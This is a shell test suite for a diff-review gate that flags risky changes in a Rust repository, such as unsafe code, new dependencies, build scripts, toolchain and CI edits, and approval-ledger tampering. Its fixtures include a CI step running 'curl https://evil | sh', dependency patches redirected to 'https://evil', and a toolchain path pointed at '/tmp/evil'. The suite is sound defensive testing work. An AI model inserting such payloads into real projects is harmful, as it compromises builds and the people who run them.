# 1. Paths git would C-quote.
VIOL2='fn f() { unsafe { g() } } fn h() { std::process::Command::new("sh"); }'
export VIOL2
EXPECT="unsafe process" case_run "path: non-ASCII .rs file" 1 : 'printf "%s\n" "$VIOL2" >src/é.rs'
EXPECT="unsafe" case_run "path: double quote in a .rs file name" 1 : 'printf "%s\n" "$VIOL2" >"src/a\"b.rs"'
EXPECT="ci-workflow" case_run "path: non-ASCII workflow file" 1 : 'mkdir -p .github/workflows && echo "name: x" >.github/workflows/é.yml'
EXPECT="build-script" case_run "path: build.rs under a non-ASCII directory" 1 : 'mkdir -p crates/é && echo "fn main() {}" >crates/é/build.rs'
EXPECT="new-dep" case_run "path: Cargo.toml under a non-ASCII directory" 1 : \
    'mkdir -p crates/é && printf "[package]\nname = \"e\"\n\n[dependencies]\nevil = \"1\"\n" >crates/é/Cargo.toml'
case_run "path: control character in a path is a setup error" 2 : 'printf "fn f() {}\n" >"src/a$(printf "\t")b.rs"'
d="$WORK/wt_nonascii" && fixture_repo "$d" && git add -A && git commit -qm base && base="$(git rev-parse HEAD)"
printf '%s\n' "$VIOL2" >src/é.rs
out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree 2>&1)"; rc=$?
EXPECT="unsafe process" check_result "worktree: untracked non-ASCII .rs file" 1 "$rc" "$out"
cd "$ROOT" || exit 2

# 2. Code that reaches the compiler without being scanned as a .rs file.
EXPECT="include" case_run "include: include! of a non-.rs file" 1 : 'echo "fn f() { unsafe { g() } }" >evil.inc; echo "include!(\"../evil.inc\");" >>src/lib.rs'
EXPECT="include" case_run "include: #[path] module from a non-.rs file" 1 : 'echo "fn f() { unsafe { g() } }" >src/evil.txt; echo "#[path = \"evil.txt\"] mod m;" >>src/lib.rs'
EXPECT="include" case_run "include: include! of a computed path" 1 : 'echo "include!(concat!(env!(\"OUT_DIR\"), \"/x.rs\"));" >>src/lib.rs'
case_run "include: include! of a clean .rs file passes" 0 : 'echo "pub fn g() {}" >src/gen.rs; echo "include!(\"gen.rs\");" >>src/lib.rs'
EXPECT="special-file" case_run "symlink: added .rs symlink" 1 : 'echo "fn f() { unsafe { g() } }" >evil.txt; ln -s ../evil.txt src/link.rs'
EXPECT="special-file" case_run "symlink: changed symlink target" 1 'echo a >a.txt; echo b >b.txt; ln -s a.txt l' 'rm l; ln -s b.txt l'
EXPECT="unsafe" case_run "rename: .txt renamed to .rs is scanned in full" 1 'echo "fn f() { unsafe { g() } }" >evil.txt' 'git mv evil.txt src/evil.rs'
EXPECT="build-script" case_run "rename: .txt renamed to build.rs is a new build script" 1 'echo "fn main() {}" >x.txt' 'git mv x.txt build.rs'
EXPECT="unsafe" case_run "rename: upper-case .RS file is scanned" 1 : 'echo "fn f() { unsafe { g() } }" >src/EVIL.RS'
EXPECT="toolchain-config" case_run "toolchain: .cargo/config.toml added" 1 : 'mkdir -p .cargo && printf "[build]\nrustc-wrapper = \"./w.sh\"\n" >.cargo/config.toml'
EXPECT="toolchain-config" case_run "toolchain: nested .cargo/config edited" 1 'mkdir -p crates/x/.cargo && echo "[build]" >crates/x/.cargo/config' 'echo "linker = \"./l.sh\"" >>crates/x/.cargo/config'
EXPECT="toolchain-config" case_run "toolchain: rust-toolchain.toml edited" 1 'printf "[toolchain]\nchannel = \"1.95\"\n" >rust-toolchain.toml' 'printf "[toolchain]\npath = \"/tmp/evil\"\n" >rust-toolchain.toml'
EXPECT="toolchain-config" case_run "toolchain: rust-toolchain added" 1 : 'echo "1.95" >rust-toolchain'

# 3. Cargo.toml forms that add or redirect code.
EXPECT="new-dep" case_run "cargo: [patch.crates-io] entry" 1 : 'printf "\n[patch.crates-io]\nexisting = { git = \"https://evil\" }\n" >>Cargo.toml'
EXPECT="new-dep" case_run "cargo: [patch] table form" 1 : 'printf "\n[patch.crates-io.existing]\ngit = \"https://evil\"\n" >>Cargo.toml'
EXPECT="new-dep" case_run "cargo: [replace] entry" 1 : 'printf "\n[replace]\n\"existing:1.0.0\" = { git = \"https://evil\" }\n" >>Cargo.toml'
EXPECT="new-dep" case_run "cargo: quoted dependency key" 1 : 'printf "\"evil\" = \"1\"\n" >>Cargo.toml'
EXPECT="new-dep" case_run "cargo: registry added to an existing dep" 1 : 'sed -i.bak "s/^existing = \"1\"/existing = { version = \"1\", registry = \"evil\" }/" Cargo.toml; rm Cargo.toml.bak'
EXPECT="new-dep" case_run "cargo: package rename of an existing dep" 1 : 'sed -i.bak "s/^existing = \"1\"/existing = { version = \"1\", package = \"evil\" }/" Cargo.toml; rm Cargo.toml.bak'
EXPECT="build-script" case_run "cargo: inline package table with build" 1 : \
    'mkdir -p crates/y && printf "package = { name = \"y\", version = \"0.1.0\", build = \"b.rs\" }\n" >crates/y/Cargo.toml'
EXPECT="proc-macro" case_run "cargo: inline lib table with proc-macro" 1 : 'mkdir -p crates/y && printf "lib = { proc-macro = true }\n" >crates/y/Cargo.toml'
EXPECT="build-script proc-macro" case_run "cargo: dotted and quoted keys" 1 : \
    'mkdir -p crates/y && printf "package.\"build\" = \"b.rs\"\nlib.proc_macro = true\n" >crates/y/Cargo.toml'
EXPECT="include" case_run "cargo: target path to a non-.rs file" 1 : 'printf "\n[lib]\npath = \"src/lib.txt\"\n" >>Cargo.toml'
EXPECT="build-script" case_run "cargo: escaped quoted key can spell build" 1 : "printf '\"bu\\\\u0069ld\" = \"b.rs\"\n' >>Cargo.toml"
EXPECT="unsafe" case_run "lexer: a NUL byte in a string does not end the line" 1 : "printf 'fn f() { let _s = \"a\\000b\"; unsafe { g() } }\n' >>src/lib.rs"
EXPECT="include" case_run "include: include macro under an alias" 1 : "echo 'use core::include as inc; inc!(\"x.txt\");' >>src/lib.rs"
case_run "cargo: version bump of an existing dep still passes" 0 : 'sed -i.bak "s/^existing = \"1\"/existing = \"1.2\"/" Cargo.toml; rm Cargo.toml.bak'

# G2 (2026-11-15): Cargo-rule patterns match the dependency line itself, with any trailing
# TOML comment stripped, never the gate's own "new entry in [...]:" prefix or a comment.
export APPROVE_RVF="[[approval]]
rule = \"new-dep\"
path = \"**/Cargo.toml\"
pattern = 'rvf-(crypto|wire)([[:space:]]*=|\\])'
reason = \"r\"
approved_by = \"o\""
export APPROVE_RVF_ANCHORED="[[approval]]
rule = \"new-dep\"
path = \"Cargo.toml\"
pattern = '^rvf-crypto[[:space:]]*='
reason = \"r\"
approved_by = \"o\""
export APPROVE_BUILD_KEY="[[approval]]
rule = \"build-script\"
path = \"Cargo.toml\"
pattern = 'build = \"ok.rs\"'
reason = \"r\"
approved_by = \"o\""
EXPECT="new-dep" case_run "g2: trailing comment naming an approved dep does not approve" 1 \
    'printf "%s\n" "$APPROVE_RVF" >config/diff-gate-approvals.toml' \
    'printf "evil = { git = \"https://evil\" } # rvf-crypto =\n" >>Cargo.toml'
case_run "g2: approved dep with a trailing comment still passes" 0 \
    'printf "%s\n" "$APPROVE_RVF" >config/diff-gate-approvals.toml' \
    'printf "rvf-crypto = \"0.3\" # upstream\n" >>Cargo.toml'
EXPECT="new-dep" case_run "g2: a # inside a quoted source does not end the line" 1 : \
    'sed -i.bak "s|^existing = \"1\"|existing = { version = \"1\", git = \"https://e/#frag\" }|" Cargo.toml; rm Cargo.toml.bak'
case_run "g2: cargo patterns see the dependency line itself (^ anchors)" 0 \
    'printf "%s\n" "$APPROVE_RVF_ANCHORED" >config/diff-gate-approvals.toml' \
    'printf "rvf-crypto = \"0.3\"\n" >>Cargo.toml'
EXPECT="new-dep" case_run "g2: cargo patterns do not match the gate prefix" 1 \
    "printf '[[approval]]\nrule = \"new-dep\"\npath = \"Cargo.toml\"\npattern = \"new entry in\"\nreason = \"r\"\napproved_by = \"o\"\n' >config/diff-gate-approvals.toml" \
    'printf "evil = \"1\"\n" >>Cargo.toml'
EXPECT="build-script" case_run "g2: a comment on a build key line does not approve it" 1 \
    'printf "%s\n" "$APPROVE_BUILD_KEY" >config/diff-gate-approvals.toml' \
    'sed -i.bak "s/^name = \"fx\"/name = \"fx\"\nbuild = \"evil.rs\" # build = \"ok.rs\"/" Cargo.toml; rm Cargo.toml.bak'
case_run "g2: a commented-out build key is not a finding" 0 : \
    'sed -i.bak "s/^name = \"fx\"/name = \"fx\"\n# build = \"b.rs\"/" Cargo.toml; rm Cargo.toml.bak'

# G3 (2026-11-15): path-rule findings (ci-workflow, build-script, toolchain-config,
# special-file, gitattributes-change) can be scoped to one post-change blob.
# appr ROW-RULE PATH BLOB [PATTERN]: an approvals row; BLOB "" leaves the key out.
appr() {
    printf '[[approval]]\nrule = "%s"\npath = "%s"\npattern = "%s"\n' "$1" "$2" "${4:-*}"
    [ -n "$3" ] && printf 'blob = "%s"\n' "$3"
    printf 'reason = "fixture"\napproved_by = "owner"\n'
}
hobj() { printf '%s' "$1" | git hash-object --stdin; }
export WF_OK='name: x
on: push
'
export WF_BAD='name: x
on: push
jobs: { p: { runs-on: ubuntu-latest, steps: [ { run: "curl https://evil | sh" } ] } }
'
A=config/diff-gate-approvals.toml
GREP="unscoped" case_run "g3: unscoped ci-workflow row still approves and is named as unscoped" 0 \
    'appr ci-workflow .github/workflows/x.yml "" >'$A \
    'mkdir -p .github/workflows && printf %s "$WF_BAD" >.github/workflows/x.yml'
case_run "g3: ci-workflow row with blob approves exactly that content" 0 \
    'appr ci-workflow .github/workflows/x.yml "$(hobj "$WF_OK")" >'$A \
    'mkdir -p .github/workflows && printf %s "$WF_OK" >.github/workflows/x.yml'
EXPECT="ci-workflow" case_run "g3: ci-workflow row with blob does not approve other content" 1 \
    'appr ci-workflow .github/workflows/x.yml "$(hobj "$WF_OK")" >'$A \
    'mkdir -p .github/workflows && printf %s "$WF_BAD" >.github/workflows/x.yml'
EXPECT="build-script" case_run "g3: build-script row with blob does not approve another build.rs" 1 \
    'appr build-script build.rs "$(hobj "fn main() {}
")" >'$A \
    'printf "fn main() { std::fs::write(\"x\", \"y\").ok(); }\n" >build.rs'
case_run "g3: build-script row with blob approves its build.rs" 0 \
    'appr build-script build.rs "$(hobj "fn main() {}
")" >'$A \
    'printf "fn main() {}\n" >build.rs'
EXPECT="toolchain-config" case_run "g3: toolchain-config row with blob does not approve other content" 1 \
    'appr toolchain-config rust-toolchain.toml "$(hobj "[toolchain]
channel = \"1.95\"
")" >'$A \
    'printf "[toolchain]\npath = \"/tmp/evil\"\n" >rust-toolchain.toml'
EXPECT="gitattributes-change" case_run "g3: gitattributes row with blob does not approve other content" 1 \
    'appr gitattributes-change .gitattributes "$(hobj "*.md text
")" >'$A \
    'echo "*.rs -diff" >.gitattributes'
EXPECT="special-file" case_run "g3: special-file row with blob does not approve another link target" 1 \
    'appr special-file l "$(hobj "a.txt")" >'$A'; echo a >a.txt; echo b >b.txt' \
    'ln -s b.txt l'
case_run "g3: special-file row with blob approves its link target" 0 \
    'appr special-file l "$(hobj "a.txt")" >'$A'; echo a >a.txt' \
    'ln -s a.txt l'
case_run "g3: malformed blob is a setup error" 2 \
    'appr ci-workflow .github/workflows/x.yml "xyz" >'$A 'echo hi >README.md'
case_run "g3: unknown key in an approval is a setup error" 2 \
    'appr ci-workflow .github/workflows/x.yml "" | sed "s/^pattern/blobs = \"0\"\npattern/" >'$A 'echo hi >README.md'
# worktree mode hashes the working-tree bytes
d="$WORK/g3_worktree" && fixture_repo "$d" && appr ci-workflow .github/workflows/x.yml "$(hobj "$WF_OK")" >$A
mkdir -p .github/workflows && echo "name: old" >.github/workflows/x.yml && git add -A && git commit -qm base && base="$(git rev-parse HEAD)"
printf %s "$WF_OK" >.github/workflows/x.yml
out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree 2>&1)"; rc=$?
check_result "g3: worktree: blob row approves the working-tree content" 0 "$rc" "$out"
printf %s "$WF_BAD" >.github/workflows/x.yml
out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree 2>&1)"; rc=$?
EXPECT="ci-workflow" check_result "g3: worktree: blob row does not approve other working-tree content" 1 "$rc" "$out"
cd "$ROOT" || exit 2
# the blob is part of the ledger hash: an agent cannot re-point a ledgered row at its own file
row_sha6() { # rule path pattern blob reason approved_by
    printf 'rule=%s\npath=%s\npattern=%s\nreason=%s\napproved_by=%s\nblob=%s\n' "$1" "$2" "$3" "$5" "$6" "$4" |
        { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi; } | cut -d' ' -f1
}
export ROWB1 ROWB2 LEDGER_B1
ROWB1="$(appr ci-workflow .github/workflows/x.yml 1111111111111111111111111111111111111111)"
ROWB2="$(appr ci-workflow .github/workflows/x.yml 2222222222222222222222222222222222222222)"
LEDGER_B1="[[entry]]
decision = \"owner-2026-11-15-blob\"
date     = \"2026-11-15\"
sha256   = \"$(row_sha6 ci-workflow .github/workflows/x.yml '*' 1111111111111111111111111111111111111111 fixture owner)\""
EXPECT="approvals-change" case_run "g3: ledger: re-pointing a ledgered row's blob fails" 1 \
    'printf "%s\n" "$LEDGER_B1" >'$L'; printf "%s\n" "$ROWB1" >'$A \
    'printf "%s\n" "$ROWB2" >'$A
case_run "g3: ledger: a ledgered blob row lands" 0 \
    'printf "%s\n" "$LEDGER_B1" >'$L \
    'printf "%s\n" "$ROWB1" >'$A

# G1 interim (2026-11-15, owner option c): every added non-blank .rs line in non-test code under
# a sensitive crate (config/diff-gate-sensitive.toml, read at the base tip) is a
# sensitive-crate finding that only an approval row clears.
export SENS='[[sensitive]]
path   = "crates/k/**"
reason = "fixture kernel"

[[exempt]]
path   = "**/tests/**"
reason = "integration tests"

[[exempt]]
path   = "**/*_tests.rs"
reason = "test modules"'
export SUP='pub fn signal_pgid(pgid: i32, sig: i32) {
    // SAFETY: fixture
    unsafe { libc::kill(-pgid, sig); }
}'
S=config/diff-gate-sensitive.toml
SBASE='printf "%s\n" "$SENS" >'$S'; mkdir -p crates/k/src crates/other/src; printf "%s\n" "$SUP" >crates/k/src/supervise.rs; printf "%s\n" "$SUP" >crates/other/src/supervise.rs'
CALLER='pub fn stop(pgid: i32) { signal_pgid(pgid, 9); }'
export CALLER
EXPECT="sensitive-crate" case_run "sensitive: new caller of an existing unsafe libc::kill (7306a144)" 1 "$SBASE" \
    'printf "%s\n" "$CALLER" >>crates/k/src/supervise.rs'
case_run "sensitive: control, the same caller outside sensitive crates passes" 0 "$SBASE" \
    'printf "%s\n" "$CALLER" >>crates/other/src/supervise.rs'
case_run "sensitive: blank lines are not findings" 0 "$SBASE" 'printf "\n\n" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: doc comment lines count (doctests run)" 1 "$SBASE" \
    'printf "/// \`\`\`\n/// std::process::Command::new(\"sh\");\n/// \`\`\`\npub fn d() {}\n" >>crates/k/src/supervise.rs'
case_run "sensitive: tests/ is exempt" 0 "$SBASE" 'mkdir -p crates/k/tests && printf "%s\n" "$CALLER" >crates/k/tests/t.rs'
case_run "sensitive: *_tests.rs is exempt" 0 "$SBASE" 'printf "%s\n" "$CALLER" >crates/k/src/supervise_tests.rs'
export TMOD='#[cfg(test)]
mod tests {
    #[test]
    fn t() { let _s = "}"; super::signal_pgid(1, 0); }
}'
case_run "sensitive: a #[cfg(test)] mod block is exempt" 0 "$SBASE" 'printf "%s\n" "$TMOD" >>crates/k/src/supervise.rs'
case_run "sensitive: #[cfg(all(test, unix))] with attributes between is exempt" 0 "$SBASE" \
    'printf "#[cfg(all(test, unix))]\n#[allow(dead_code)]\n// note\npub(crate) mod t {\n    fn a() {}\n}\n" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: code after a cfg(test) module closes is flagged" 1 "$SBASE" \
    'printf "%s\n%s\n" "$TMOD" "$CALLER" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: code on the closing line of a cfg(test) module is flagged" 1 "$SBASE" \
    'printf "#[cfg(test)]\nmod tests {\n    fn t() {}\n} %s\n" "$CALLER" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: a { in a string does not extend a cfg(test) module" 1 "$SBASE" \
    'printf "#[cfg(test)]\nmod tests {\n    const S: &str = \"{\";\n    const C: char = '\''{'\'';\n}\n%s\n" "$CALLER" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: a cfg(test) module that never closes exempts nothing" 1 "$SBASE" \
    'printf "#[cfg(test)]\nmod tests {\n    %s\n" "$CALLER" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: cfg(any(test, ...)) is not exempt" 1 "$SBASE" \
    'printf "#[cfg(any(test, feature = \"x\"))]\nmod t {\n    %s\n}\n" "$CALLER" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: cfg(test) on a fn is not treated as a module" 1 "$SBASE" \
    'printf "#[cfg(test)]\nfn t() {\n    super::stop(1);\n}\n" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: Cargo target path into tests/ is flagged" 1 \
    "$SBASE"'; printf "[package]\nname = \"k\"\n" >crates/k/Cargo.toml' \
    'printf "\n[lib]\npath = \"tests/evil.rs\"\n" >>crates/k/Cargo.toml'
export SUP_FINAL="$SUP
$CALLER"
case_run "sensitive: a blob row approves the reviewed file content" 0 \
    "$SBASE"'; appr sensitive-crate crates/k/src/supervise.rs "$(hobj "$SUP_FINAL
")" >'$A \
    'printf "%s\n" "$CALLER" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate" case_run "sensitive: a blob row does not approve a different version" 1 \
    "$SBASE"'; appr sensitive-crate crates/k/src/supervise.rs "$(hobj "$SUP_FINAL
")" >'$A \
    'printf "%s\n%s\n" "$CALLER" "pub fn more() {}" >>crates/k/src/supervise.rs'
EXPECT="sensitive-crate approvals-change" case_run "sensitive: list is read at the base tip; removing a crate in the diff does not exempt it" 1 "$SBASE" \
    'printf "# emptied\n" >'$S'; printf "%s\n" "$CALLER" >>crates/k/src/supervise.rs'
EXPECT="approvals-change" case_run "sensitive: list change is owner only" 1 : 'printf "%s\n" "$SENS" >'$S
case_run "sensitive: list change passes with the owner flag" 0 : 'printf "%s\n" "$SENS" >'$S DIFF_GATE_OWNER_APPROVED=1
case_run "sensitive: malformed list on the base is a setup error" 2 \
    'printf "[[sensitive]]\nreason = \"no path\"\n" >'$S 'echo hi >README.md'

# 10. Token helper (G1, option b). A helper that is missing, unbuildable, of another protocol,
# failing or printing junk gives an owner-only rust-tokens finding per changed .rs file.
ADD_RS='echo "fn z() {}" >>src/lib.rs'
EXPECT="rust-tokens" case_run "tokens: missing helper is an owner-only finding" 1 : "$ADD_RS" DIFF_GATE_TOKENS_BIN=/nonexistent/diff-gate-tokens
case_run "tokens: owner flag clears helper unavailable" 0 : "$ADD_RS" DIFF_GATE_TOKENS_BIN=/nonexistent/diff-gate-tokens DIFF_GATE_OWNER_APPROVED=1
EXPECT="rust-tokens" case_run "tokens: an approval row does not clear helper unavailable" 1 \
    "printf '%s\n' '[[approval]]
rule = \"rust-tokens\"
path = \"**\"
pattern = \"*\"
reason = \"r\"
approved_by = \"o\"' >config/diff-gate-approvals.toml" "$ADD_RS" DIFF_GATE_TOKENS_BIN=/nonexistent/diff-gate-tokens
EXPECT="rust-tokens" case_run "tokens: wrong protocol" 1 : "$ADD_RS" DIFF_GATE_TOKENS_BIN="$STUB" DIFF_GATE_STUB_PROTOCOL=other
EXPECT="rust-tokens" case_run "tokens: helper exits non-zero" 1 : "$ADD_RS" DIFF_GATE_TOKENS_BIN="$STUB" DIFF_GATE_STUB_RC=3
EXPECT="rust-tokens" case_run "tokens: malformed helper output" 1 : "$ADD_RS" DIFF_GATE_TOKENS_BIN="$STUB" DIFF_GATE_STUB_OUT=garbage
EXPECT="rust-tokens" case_run "tokens: finding for a path not in the diff is malformed" 1 : "$ADD_RS" DIFF_GATE_TOKENS_BIN="$STUB" \
    DIFF_GATE_STUB_OUT="$(printf 'unsafe\tsrc/other.rs\t1\tx')"
EXPECT="process" case_run "tokens: a helper finding is reported" 1 : "$ADD_RS" DIFF_GATE_TOKENS_BIN="$STUB" \
    DIFF_GATE_STUB_OUT="$(printf 'process\tsrc/lib.rs\t2\tfn z() {}\t\t1-2\tfn z() {}')"
EXPECT="unsafe" case_run "tokens: helper and lexer findings on one line merge" 1 : 'echo "fn f() { unsafe { g() } }" >>src/lib.rs' DIFF_GATE_TOKENS_BIN="$STUB" \
    DIFF_GATE_STUB_OUT="$(printf 'unsafe\tsrc/lib.rs\t2\tfn f() { unsafe { g() } }\t\t10-15\tfn f() { unsafe { g() } }')"
case_run "tokens: docs-only diff needs no helper" 0 : 'echo hi >README.md' DIFF_GATE_TOKENS_BIN=/nonexistent/diff-gate-tokens
EXPECT="rust-tokens" case_run "tokens: base without tools/diff-gate-tokens" 1 : "$ADD_RS" DIFF_GATE_TOKENS_BIN=
EXPECT="ci-workflow" case_run "tokens: a change to the helper source is an owner finding" 1 : \
    'mkdir -p tools/diff-gate-tokens && echo x >tools/diff-gate-tokens/README.md'
EXPECT="rust-tokens" case_run "tokens: a cache inside the checkout is refused" 1 \
    'mkdir -p tools/diff-gate-tokens && echo x >tools/diff-gate-tokens/README.md' "$ADD_RS" DIFF_GATE_TOKENS_BIN= DIFF_GATE_CACHE=target/tok-cache
d="$WORK/tokens_merge" && fixture_repo "$d" && git add -A && git commit -qm base && base="$(git rev-parse HEAD)"
echo "fn f() { unsafe { g() } }" >>src/lib.rs && git add -A && git commit -qm change
out="$(DIFF_GATE_BASE="$base" DIFF_GATE_TOKENS_BIN="$STUB" DIFF_GATE_STUB_OUT="$(printf 'unsafe\tsrc/lib.rs\t2\tfn f() { unsafe { g() } }\t\t10-15\tfn f() { unsafe { g() } }')" "$GATE" 2>&1)"; rc=$?
[ "$(echo "$out" | grep -c 'FAIL *unsafe')" = 1 ] || rc="dup"
check_result "tokens: one merged finding, not two" 1 "$rc" "$out"
cd "$ROOT" || exit 2

# 11. With the real helper: the G1 escapes the line lexer missed.
if [ "$REAL_TOKENS" = 1 ]; then
    EXPECT="process" case_run "tokens(real): spaces around ::" 1 : 'echo "fn f() { std :: process :: Command :: new(\"sh\"); }" >>src/lib.rs'
    EXPECT="process" case_run "tokens(real): glob plus alias" 1 : 'printf "use std::process::*;\nuse Command as C;\nfn f() { C::args; }\n" >src/g.rs'
    EXPECT="process" case_run "tokens(real): multi-line brace import" 1 : 'printf "use std::{\n    process::{\n        Command as K,\n    },\n};\nfn f() { K::args; }\n" >src/m.rs'
    EXPECT="net" case_run "tokens(real): use ::reqwest as r" 1 : 'printf "use ::reqwest as r;\nfn f() { let _ = r::get(1); }\n" >src/r.rs'
    EXPECT="include" case_run "tokens(real): multi-line cfg_attr path" 1 : 'printf "#[cfg_attr(\n    unix,\n    path = \"x.txt\"\n)]\nmod m;\n" >>src/lib.rs'
    EXPECT="process" case_run "tokens(real): doctest with Command" 1 : 'printf "/// \`\`\`\n/// std::process::Command::new(\"sh\");\n/// \`\`\`\npub fn d() {}\n" >>src/lib.rs'
    EXPECT="include" case_run "tokens(real): doc include_str" 1 : 'printf "#![doc = include_str!(\"README.md\")]\n" >src/x.rs'
    EXPECT="ffi" case_run "tokens(real): global_asm" 1 : 'echo "core::arch::global_asm!(\"nop\");" >>src/lib.rs'
    EXPECT="unsafe" case_run "tokens(real): line added inside an existing unsafe block" 1 \
        'printf "fn f() {\n    unsafe {\n        a();\n    }\n}\n" >src/u.rs' 'printf "fn f() {\n    unsafe {\n        a();\n        b();\n    }\n}\n" >src/u.rs'
    EXPECT="process" case_run "tokens(real): an import edit changes an unchanged line" 1 \
        'printf "use mock as p;\nfn f() { p::Command::args; }\n" >src/c.rs' 'printf "use std::process as p;\nfn f() { p::Command::args; }\n" >src/c.rs'
    EXPECT="rust-parse" case_run "tokens(real): a file that does not parse" 1 : 'printf "fn broken() {\n" >src/b.rs'
    case_run "tokens(real): strings and comments still pass" 0 : \
        'printf "// std::process::Command::new\nconst S: &str = \"unsafe TcpStream\";\n/// text: \`unsafe\`\npub fn ok() {}\n" >>src/lib.rs'
fi

# 12. Independent review round (2026-11-15, w2/diff-gate-review-fixtures): spellings, Cargo
# forms, trust inputs, rows, input robustness and the sensitive-crate rule. Cases the gate gets
# wrong today are marked KNOWN_GAP; see reports/review-diff-gate-combined-20261115.md.
# shellcheck source=scripts/tests/diff-gate-test-review.sh
. "$ROOT/scripts/tests/diff-gate-test-review.sh"

# 13. Fixes for the review findings (RV-B1, RV-B2, RV-F1, RV-E1, RV-C1, RV-D1), 2026-11-15.
# shellcheck source=scripts/tests/diff-gate-test-rv-fixes.sh
. "$ROOT/scripts/tests/diff-gate-test-rv-fixes.sh"

# 14. Review round 3 (2026-11-15): the Cargo reader, test-exemption references, trust inputs,
# rows, robustness and Rust spellings. KNOWN_GAP cases: reports/review-diff-gate-combined-r3-20261115.md.
# shellcheck source=scripts/tests/diff-gate-test-review3.sh
. "$ROOT/scripts/tests/diff-gate-test-review3.sh"

echo "diff-gate fixtures: $pass passed, $fail failed, $gaps known gaps"
[ "$fail" -eq 0 ]
